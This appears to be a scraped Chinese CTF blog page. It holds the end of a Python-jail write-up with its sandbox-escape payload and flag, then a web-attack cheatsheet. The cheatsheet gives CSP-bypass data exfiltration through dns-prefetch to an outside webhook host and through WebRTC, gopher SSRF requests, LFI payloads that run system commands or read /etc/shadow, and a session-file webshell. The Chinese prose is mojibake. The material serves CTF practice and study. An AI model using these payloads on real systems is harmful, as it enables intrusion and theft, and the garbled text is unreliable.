<span class="built_in">__import__</span>(<span class="string">&quot;conf&quot;</span>).flag</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">desc_helper</span>(<span class="params">self, name</span>):</span><br><span class="line">        origin = <span class="built_in">getattr</span>(<span class="built_in">type</span>, name)</span><br><span class="line">        <span class="keyword">if</span> origin == <span class="built_in">type</span>.__getattribute__:</span><br><span class="line">            <span class="keyword">raise</span> NameError(</span><br><span class="line">                <span class="string">&quot;Access to forbidden name %r (%r)&quot;</span> % (name, <span class="string">&quot;__getattribute__&quot;</span>)</span><br><span class="line">            )</span><br><span class="line">        <span class="variable language_">self</span>.helper = origin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    desc = Desc()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test = Test()</span><br><span class="line">test.desc = <span class="string">&quot;flag&#123;fakeflag&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Just a tricky way to print a welcome message, or maybe a hint :/</span></span><br><span class="line"><span class="comment"># You can just `print(getdoc(Desc))`</span></span><br><span class="line"><span class="comment"># This is not part of the challenge, but if you can get the flag through here, please contact @Vincent55.</span></span><br><span class="line">welcome_msg = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">desctmp := Desc()</span></span><br><span class="line"><span class="string">desctmp.desc_helper(&quot;__base__&quot;)</span></span><br><span class="line"><span class="string">Obj := desctmp.helper</span></span><br><span class="line"><span class="string">desctmp := Desc()</span></span><br><span class="line"><span class="string">desctmp.desc_helper(&quot;__subclasses__&quot;)</span></span><br><span class="line"><span class="string">print(getdoc(desctmp.helper(Obj)[-2]))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.strip().replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;,&quot;</span>)</span><br><span class="line">welcome_msg = <span class="string">f&quot;(<span class="subst">&#123;welcome_msg&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">safe_eval(</span><br><span class="line">    welcome_msg,</span><br><span class="line">    &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;Desc&quot;</span>: Desc, <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span>, <span class="string">&quot;getdoc&quot;</span>: getdoc&#125;,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Your challenge begin here!</span></span><br><span class="line">payload = <span class="built_in">input</span>(<span class="string">&quot;âœï¸: &quot;</span>)</span><br><span class="line"></span><br><span class="line">safe_eval(</span><br><span class="line">    payload,</span><br><span class="line">    &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;Desc&quot;</span>: Desc&#125;,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(f&quot;test.__dict__: &#123;test.__dict__&#125;&quot;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ğŸš©: <span class="subst">&#123;test.desc&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>çœ‹å®Œ source code å¯ä»¥ç™¼ç¾ä»–åœ¨print <code>welcome_msg</code> çš„æ™‚å€™ç”¨äº†ä¸€å€‹éå¸¸è©­ç•°çš„æ–¹æ³•ï¼Œä¹Ÿç®—æ˜¯é€™é¡Œçš„é¡Œç¤ºã€‚</p>
<h3 id="welcome-msgåˆ°åº•åœ¨å¹¹å˜›"><a href="#welcome-msgåˆ°åº•åœ¨å¹¹å˜›" class="headerlink" title="welcome_msgåˆ°åº•åœ¨å¹¹å˜›"></a>welcome_msgåˆ°åº•åœ¨å¹¹å˜›</h3><p>é¦–å…ˆçœ‹åˆ°ä¸‹é¢é€™æ®µç¨‹å¼ç¢¼ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">welcome_msg = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">desctmp := Desc()</span></span><br><span class="line"><span class="string">desctmp.desc_helper(&quot;__base__&quot;)</span></span><br><span class="line"><span class="string">Obj := desctmp.helper</span></span><br><span class="line"><span class="string">desctmp := Desc()</span></span><br><span class="line"><span class="string">desctmp.desc_helper(&quot;__subclasses__&quot;)</span></span><br><span class="line"><span class="string">print(getdoc(desctmp.helper(Obj)[-2]))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.strip().replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;,&quot;</span>)</span><br><span class="line">welcome_msg = <span class="string">f&quot;(<span class="subst">&#123;welcome_msg&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">safe_eval(</span><br><span class="line">    welcome_msg,</span><br><span class="line">    &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;Desc&quot;</span>: Desc, <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span>, <span class="string">&quot;getdoc&quot;</span>: getdoc&#125;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>å…¶å¯¦æœƒç™¼ç¾ä½ å¯ä»¥é€é <code>getattr(type, name)</code> å–å¾—<code>type</code>åº•ä¸‹çš„attribute<br>é€™è£¡æœƒå¡ä¸€å€‹çŸ¥è­˜é»ï¼Œå°±æ˜¯ç•¶ä½ è¦å–å¾—æŸå€‹ class çš„ subclass çš„æ™‚å€™(å‡è¨­æ˜¯ str )ï¼Œæœƒå¯« <code>str.__subclasses__()</code> ï¼Œä½†å…¶å¯¦å¯ä»¥å¯«æˆ <code>type.__subclasses__(str)</code> ï¼Œå‰ææ˜¯ <code>str</code> çš„ <code>class</code> å¿…é ˆæ˜¯ <code>type</code></p>
<p><strong>æ‰€ä»¥æˆ‘å€‘å¯ä»¥å…ˆé€é <code>getattr(type,&quot;__subclasses__&quot;)</code> å–å¾— <code>type.__subclasses__</code> å†æŠŠ <code>__base__</code> å¡é€²å»å°±å¯ä»¥å¾—åˆ° <code>type.__base__.__subclasses__()</code></strong></p>
<p>å¥½åˆ°é€™é‚Šå¤§å®¶æ‡‰è©²å·²ç¶“ææ‡‚ä¸Šé¢é‚£é™€ <code>welcome_msg</code> çš„ payload åˆ°åº•åœ¨å¹¹å˜›äº†ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯åˆ° <code>object</code> è£¡é¢æŠŠæ‰€æœ‰ class æŠ“å‡ºä¾†ï¼Œç„¶å¾ŒæŠ“å€’æ•¸ç¬¬2å€‹ <code>class</code> (<code>jail.Desc</code>)æŠŠå®ƒå°å‡ºä¾†</p>
<h3 id="è§£é¡Œ"><a href="#è§£é¡Œ" class="headerlink" title="è§£é¡Œ"></a>è§£é¡Œ</h3><p>ä¸€é–‹å§‹æƒ³æ”¹æŠ“ <code>jail.Test</code> ä¸‹é¢çš„ <code>desc</code> å°±å¯ä»¥æ‹¿åˆ° <code>flag</code> äº†<br>æŠ“æ˜¯æŠ“å¾—åˆ°ï¼Œä½†æ˜¯printä¸å‡ºä¾†å•Š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = Desc();a.desc_helper(<span class="string">&quot;__base__&quot;</span>);obj=a.helper;a = Desc();a.desc_helper(<span class="string">&quot;__subclasses__&quot;</span>);obj = a.helper(obj)[-<span class="number">1</span>].desc</span><br></pre></td></tr></table></figure>

<p>é€™é‚Šåˆå¡ä¸€å€‹çŸ¥è­˜é»äº†ï¼Œé‚£å°±æ˜¯ <strong>python çš„ descriptor è§£ææœ‰å„ªå…ˆåº¦çš„å•é¡Œ</strong>(é¡Œç›®æœ‰æç¤ºdescribeï¼Œé›–ç„¶æˆ‘è¦ºå¾—æ²’æœ‰äººçœ‹å¾—æ‡‚)</p>
<p>ä»¥ä¸‹åƒè€ƒ @Vincent550102 çš„ç­†è¨˜ï¼š</p>
<blockquote>
<ul>
<li>å¦‚æœ __get__ èˆ‡ __set__ éƒ½æœ‰ï¼Œå„ªå…ˆä½¿ç”¨æè¿°å™¨ï¼ˆDescriptorï¼‰ï¼š<br>ç•¶ä¸€å€‹æè¿°å™¨åŒæ™‚å¯¦ç¾äº† __get__ å’Œ __set__ æ–¹æ³•æ™‚ï¼ŒPython æœƒèªç‚ºå®ƒæ˜¯ä¸€å€‹è³‡æ–™æè¿°å™¨ï¼ˆData Descriptorï¼‰ã€‚è³‡æ–™æè¿°å™¨çš„ä¸€å€‹ç‰¹é»æ˜¯å®ƒå€‘å°å±¬æ€§çš„è¨ªå•æœ‰æ›´é«˜çš„å„ªå…ˆç´šã€‚<br>å¦‚æœä¸æ˜¯ï¼Œå‰‡åœ¨è‡ªå·±çš„ __dict__ è£¡é¢æ‰¾ï¼š</li>
<li>å¦‚æœæè¿°å™¨æ²’æœ‰ä½œç‚ºè³‡æ–™æè¿°å™¨æˆ–è€…åªå¯¦ç¾äº† __get__ æ–¹æ³•çš„éè³‡æ–™æè¿°å™¨ï¼ˆNon-Data Descriptorï¼‰æˆ–è€…æ‰¾ä¸åˆ°æè¿°å™¨ï¼ŒPython æœƒç¹¼çºŒåœ¨ç‰©ä»¶çš„ __dict__ å±¬æ€§å­—å…¸ä¸­å°‹æ‰¾æ˜¯å¦å­˜åœ¨è©²å±¬æ€§ã€‚</li>
<li>è‹¥åœ¨ __dict__ ä¹Ÿæ‰¾ä¸åˆ°ï¼Œå˜—è©¦ç”¨æè¿°å™¨çš„ __get__ï¼š<br>å¦‚æœåœ¨ç‰©ä»¶çš„ <strong>dict</strong> ä¸­æ‰¾ä¸åˆ°è©²å±¬æ€§ï¼ŒPython æœƒæª¢æŸ¥æ˜¯å¦å­˜åœ¨åªå¯¦ç¾äº† <strong>get</strong> æ–¹æ³•çš„éè³‡æ–™æè¿°å™¨ï¼Œå¦‚æœå­˜åœ¨ï¼Œå‰‡å›å‚³è©²æè¿°å™¨çš„ __get__ æ–¹æ³•ã€‚<br>éƒ½æ²’æœ‰ï¼Œç›´æ¥å›å‚³æè¿°å™¨ï¼š</li>
<li>å¦‚æœä¸Šè¿°æ­¥é©Ÿéƒ½ç„¡æ³•æ‰¾åˆ°è©²å±¬æ€§ï¼Œæœ€å¾Œæœƒè¿”å›æè¿°å™¨ç‰©ä»¶æœ¬èº«ï¼Œå¦‚æœé€£æè¿°å™¨ä¹Ÿä¸å­˜åœ¨ï¼Œå‰‡æœƒæ‹‹å‡º AttributeErrorã€‚</li>
</ul>
</blockquote>
<p>çœ‹åˆ°é€™é‚Šï¼Œå•é¡Œå·²ç¶“è®Šå¾ˆç°¡å–®äº†ï¼Œé‚£å°±æ˜¯<strong>æˆ‘å€‘éœ€è¦å°‡ <code>__get__</code> è®Šæˆæœ€é«˜å„ªå…ˆç´š</strong>ï¼Œæ­¤æ™‚å¾Œé¢å°±ç®— fake_flag æŠŠ <code>test.desc</code> è“‹æ‰ä¹Ÿæ²’æœ‰ç”¨ï¼Œä»ç„¶æœƒå›å‚³ <code>Test.__get__()</code> çš„å…§å®¹</p>
<p>å¦‚ä½•å°‡ <code>__get__</code> è®Šæˆæœ€é«˜å„ªå…ˆç´šå‘¢ï¼Ÿ<strong>åªè¦æ–°å¢ä¸€å€‹ <code>__set__</code> å°±è¡Œäº†</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">func = <span class="keyword">lambda</span> <span class="variable language_">self</span>,obj,val:<span class="literal">None</span></span><br><span class="line">desc.__setattr__(<span class="string">&quot;__set__&quot;</span>,func)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">(a := Desc(),a.desc_helper(<span class="string">&quot;__base__&quot;</span>),obj:=a.helper,a := Desc(),a.desc_helper(<span class="string">&quot;__subclasses__&quot;</span>),desc:=a.helper(obj)[-<span class="number">2</span>],a:=Desc(),a.desc_helper(<span class="string">&quot;__setattr__&quot;</span>),func:=<span class="keyword">lambda</span> <span class="variable language_">self</span>,obj,val:<span class="literal">None</span>,a.helper(desc,<span class="string">&quot;__set__&quot;</span>,func))</span><br></pre></td></tr></table></figure>
<blockquote>
<p>AIS3{y0u_kn0w_h0w_d35cr1p70r_w0rk!}</p>
</blockquote>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2024-04-30T07:11:21.000Z" title="2024/4/30 ä¸‹åˆ3:11:21">2024-04-30</time>ç™¼è¡¨</span><span class="level-item"><time dateTime="2024-09-06T05:51:53.628Z" title="2024/9/6 ä¸‹åˆ1:51:53">2024-09-06</time>æ›´æ–°</span><span class="level-item"><a class="link-muted" href="/categories/CTF/">CTF</a><span>Â /Â </span><a class="link-muted" href="/categories/CTF/Cheatsheet/">Cheatsheet</a></span><span class="level-item">14 åˆ†é˜è®€å®Œ (å¤§ç´„2126å€‹å­—)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/04/30/CTF-Cheatsheet-Web/">CTF Cheatsheet - Web</a></p><div class="content"><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Information-Leak"><a href="#Information-Leak" class="headerlink" title="Information Leak"></a>Information Leak</h2><h3 id="git-svn-bzr"><a href="#git-svn-bzr" class="headerlink" title=".git &#x2F; .svn &#x2F; .bzr"></a>.git &#x2F; .svn &#x2F; .bzr</h3><p>ç‰ˆæœ¬æ§åˆ¶ç³»çµ±</p>
<p>.gitæ´©æ¼å¯ç”¨scrabbleå°‡æ•´å€‹.gitè³‡æ–™å¤¾ä¸‹è¼‰ä¸‹ä¾†ä¸¦ç”¨git é‚„åŸ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scrabble http://www.example.com/ </span><br></pre></td></tr></table></figure>

<h3 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:www.example.com</span><br><span class="line">intext:<span class="string">&quot;ç®¡ç†ä»‹é¢&quot;</span></span><br><span class="line">filetype:sql</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/google-hacking-database">GHDB</a></p>
<p>robots.txt</p>
<p>.DS_Store</p>
<p>.index.php.swp</p>
<p>Backup file</p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection">XSS Payload</a></p>
<h3 id="CSP-æ€éº¼å·è³‡æ–™"><a href="#CSP-æ€éº¼å·è³‡æ–™" class="headerlink" title="CSP æ€éº¼å·è³‡æ–™"></a>CSP æ€éº¼å·è³‡æ–™</h3><p>å‡è¨­ä»– Content Security Policy åœ¨äº‚å¯«ä¸€é€šçš„è©±ï¼Œå¯ä»¥ç”¨ <a target="_blank" rel="noopener" href="https://csp-evaluator.withgoogle.com/">CSP Evaluator</a> æª¢æŸ¥</p>
<p><code>CSP</code> æ²’æ“‹ç”¨ä»€éº¼å·</p>
<p>ä¾‹å¦‚ <code>CSP</code> åªæœ‰æ“‹ <code>script</code> ï¼Œé‚£å°±ç”¨ <code>&lt;img&gt;</code> ä¾†å·</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script-src &#x27;none&#x27;;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæŠŠé€£ç·šéƒ½æ“‹æ‰çš„è©±ï¼Œé‚„æ˜¯å¯ä»¥ä½¿ç”¨ <code>location.href</code> æˆ– <code>window.open()</code> é€éè·³è½‰ä¾†å·è³‡æ–™</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default-src &#x27;none&#x27;;script-src &#x27;unsafe-inline&#x27;;</span><br></pre></td></tr></table></figure>



<h4 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h4><p>å…è¨±ç‰¹å®šç¬¬ä¸‰æ–¹ç¶²ç«™å¼•å…¥æ™‚ï¼Œå¯ä»¥å˜—è©¦ä½¿ç”¨ <code>JSONP</code> å¼•å…¥æƒ¡æ„ç¨‹å¼ç¢¼</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default-src https<span class="punctuation">:</span><span class="comment">//example.com</span></span><br></pre></td></tr></table></figure>


<p><a target="_blank" rel="noopener" href="https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt">JSONBee</a></p>
<h4 id="DNS-prefetch"><a href="#DNS-prefetch" class="headerlink" title="DNS prefetch"></a>DNS prefetch</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">dns-prefetch</span> <span class="attr">href</span>=<span class="string">[YOUR_DATA].webhook.trianglesnake.com</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="WebRTC"><a href="#WebRTC" class="headerlink" title="WebRTC"></a>WebRTC</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pc = <span class="keyword">new</span> <span class="title class_">RTCPeerConnection</span>(&#123;</span><br><span class="line">  <span class="string">&quot;iceServers&quot;</span>:[</span><br><span class="line">      &#123;<span class="string">&quot;urls&quot;</span>:[</span><br><span class="line">        <span class="string">&quot;turn:74.125.140.127:19305?transport=udp&quot;</span></span><br><span class="line">       ],<span class="string">&quot;username&quot;</span>:<span class="string">&quot;_all_your_data_belongs_to_us&quot;</span>,</span><br><span class="line">      <span class="string">&quot;credential&quot;</span>:<span class="string">&quot;.&quot;</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;);</span><br><span class="line">pc.<span class="title function_">createOffer</span>().<span class="title function_">then</span>(<span class="function">(<span class="params">sdp</span>)=&gt;</span>pc.<span class="title function_">setLocalDescription</span>(sdp);</span><br></pre></td></tr></table></figure>


<h2 id="PHP-å¼±å‹åˆ¥åˆ¤æ–·"><a href="#PHP-å¼±å‹åˆ¥åˆ¤æ–·" class="headerlink" title="PHP å¼±å‹åˆ¥åˆ¤æ–·"></a>PHP å¼±å‹åˆ¥åˆ¤æ–·</h2><p><img src="/2024/04/30/CTF-Cheatsheet-Web/1.png" alt="https://i.stack.imgur.com/giVhE.png"></p>
<p><a target="_blank" rel="noopener" href="https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/211902/">PHPå¼±å‹åˆ¥çš„å®‰å…¨å•é¡Œè©³ç´°ç¸½çµ</a></p>
<h3 id="md5-sha1"><a href="#md5-sha1" class="headerlink" title="md5()&amp;sha1()"></a>md5()&amp;sha1()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="keyword">array</span>()) ==<span class="title function_ invoke__">sha1</span>(<span class="keyword">array</span>())<span class="comment">//true=&gt;error=error</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="number">240610708</span>)==<span class="number">0</span> <span class="comment">//true</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">md5(240610708)=&gt;&#x27;0e462097431906509019562988736854&#x27;</span></span><br><span class="line"><span class="comment">åœ¨å¼±å‹åˆ¥åˆ¤æ–·ä¸­æœƒåšç‚ºç§‘å­¸è¨˜è™Ÿå’Œintæ¯”è¼ƒ</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">sha1</span>(<span class="string">&#x27;aa3OFF9m&#x27;</span>)=&gt;<span class="string">&#x27;0e36977786278517984959260394024281014729&#x27;</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/shijiahao/p/12638484.html">https://www.cnblogs.com/shijiahao/p/12638484.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.twblogs.net/a/5cd66c22bd9eee67a77f66f9">https://www.twblogs.net/a/5cd66c22bd9eee67a77f66f9</a></p>
<h2 id="headerç«„æ”¹"><a href="#headerç«„æ”¹" class="headerlink" title="headerç«„æ”¹"></a>headerç«„æ”¹</h2><h3 id="å¯å½é€ ipç›¸é—œ"><a href="#å¯å½é€ ipç›¸é—œ" class="headerlink" title="å¯å½é€ ipç›¸é—œ"></a>å¯å½é€ ipç›¸é—œ</h3><ul>
<li><code>X-Forward-For</code></li>
<li><code>Client-IP</code></li>
<li><code>X-Real-IP</code></li>
</ul>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="gopher-ç”¨æ³•"><a href="#gopher-ç”¨æ³•" class="headerlink" title="gopher ç”¨æ³•"></a>gopher ç”¨æ³•</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">gopher</span>:<span class="comment">//host:port/_HTTPRequest</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//example POST request:</span></span><br><span class="line"></span><br><span class="line">*<span class="attr">gopher</span>:<span class="comment">//192.168.0.1:8888/_POST/index.php?action=login HTTP/1.1</span></span><br><span class="line"><span class="title class_">Host</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1000</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="attr">type</span>:application/x-www-form-urlencoded</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>:<span class="number">20</span></span><br><span class="line"></span><br><span class="line">username=admin&amp;password=bupt666</span><br><span class="line"><span class="comment">//æ›è¡Œè¦ç”¨%0D%0A(\r\n)*</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><em>å‚™è¨»ï¼šç™¼èµ·POSTçš„å››å€‹å¿…è¦æ¬„ä½</em><br>POST &#x2F;ssrf&#x2F;base&#x2F;post.php HTTP&#x2F;1.1<br>host:192.168.0.109<br>Content-Type:application&#x2F;x-www-form-urlencoded<br>Content-Length:11</p>
</blockquote>
<p>gopher POST request payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://localhost:80/_POST%20/flag.php%20HTTP/1.1%0d%0AHost:%20localhost%0d%0AContent-Type:%20application/x-www-form-urlencoded%0d%0AContent-Length:%207%0d%0A%0d%0afoo=bar%0d%0A</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://hackmd.io/@Lhaihai/H1B8PJ9hX">https:&#x2F;&#x2F;hackmd.io&#x2F;@Lhaihai&#x2F;H1B8PJ9hX</a></p>
<hr>
<h2 id="LFI-RFI"><a href="#LFI-RFI" class="headerlink" title="LFI&amp;RFI"></a>LFI&amp;RFI</h2><h3 id="php-require-include"><a href="#php-require-include" class="headerlink" title="php require()&amp;include()"></a>php require()&amp;include()</h3><h4 id="å½å”è­°"><a href="#å½å”è­°" class="headerlink" title="å½å”è­°"></a><strong>å½å”è­°</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//phpfilter</span></span><br><span class="line">index.php?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=target.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//phar æ‰“åŒ…æˆzipä¸‹è¼‰</span></span><br><span class="line">index.php?file=phar:<span class="comment">//test.zip/target.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//data:URL schema</span></span><br><span class="line">index.php?file=data:text/plain,<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line">index.php?file=data:text/plain;base64,**PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==**</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://codertw.com/%E5%89%8D%E7%AB%AF%E9%96%8B%E7%99%BC/384080/">data:URL schemaæ›´å¤šç”¨æ³•</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æ•æ„Ÿæª”æ¡ˆ</span></span><br><span class="line">/etc/passwd // è´¦æˆ·ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">/etc/shadow // è´¦æˆ·å¯†ç æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf // Apache2é»˜è®¤é…ç½®æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf // è™šæ‹Ÿç½‘ç«™é…ç½®</span><br><span class="line"></span><br><span class="line">/usr/local/app/php5/lib/php.ini // PHPç›¸å…³é…ç½®</span><br><span class="line"></span><br><span class="line">/etc/httpd/conf/httpd.conf // Apacheé…ç½®æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">/etc/my.conf // mysql é…ç½®æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<h3 id="SESSIONæ¤å…¥WebShell"><a href="#SESSIONæ¤å…¥WebShell" class="headerlink" title="SESSIONæ¤å…¥WebShell"></a><strong>SESSIONæ¤å…¥WebShell</strong></h3><p>è‹¥sessionå¯å¯«å…¥ï¼Œå¯ä»¥åˆ©ç”¨LFIåŸ·è¡Œphp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¯«å…¥<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line">index.php?file=/&lt;sess_path&gt;/sess_&lt;your session&gt;</span><br></pre></td></tr></table></figure>

<p>session_pathå¯ç”±phpinfoå…§æ‰¾åˆ°session.save_pathï¼Œè‹¥ç„¡å‰‡æ”¾åœ¨&#x2F;tmpå…§</p>
<p>&#x2F;var&#x2F;lib&#x2F;php&#x2F;session</p>
<p>sessionæª”åç‚ºsess_&lt;session id&gt;</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/182280.html">freebuf-LFI</a></p>
<hr>
<h2 id="JS-prototype-pollution"><a href="#JS-prototype-pollution" class="headerlink" title="JS prototype pollution"></a>JS prototype pollution</h2><p><a target="_blank" rel="noopener" href="https://github.com/aszx87410/blog/issues/88">åŸºæ–¼ JS åŸå‹éˆçš„æ”»æ“Šæ‰‹æ³•ï¼šPrototype Pollution</a></p>
<p>ç•¶javascriptåœ¨å‘¼å«å…§å»ºå‡½å¼æ™‚ï¼Œæœƒé€éprototypeæ‰¾ä¸Šä¸€å±¤è¦å‘¼å«çš„å‡½å¼(å› ç‚ºå…§å»ºå‡½å¼ä¸¦æ²’æœ‰çœŸæ­£åœ¨ä¹å«çš„ç‰©ä»¶ä¹‹ä¸­)<br>èˆ‰ä¾‹ä¾†èªª:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> lst = [<span class="string">&#x27;test&#x27;</span>]</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(lst.<span class="title function_">toString</span>())</span><br></pre></td></tr></table></figure>
<p><code>toString()</code>ä¸å¯èƒ½æ¯å€‹å®£å‘Šçš„Array Objectéƒ½æœ‰toString()ï¼Œç•¶å‘¼å«æ™‚å¿…é ˆé€éprototypeæ‰¾åˆ°ä¸Šä¸€å±¤ç„¶å¾Œå‘¼å«<code>Array.toString</code></p>
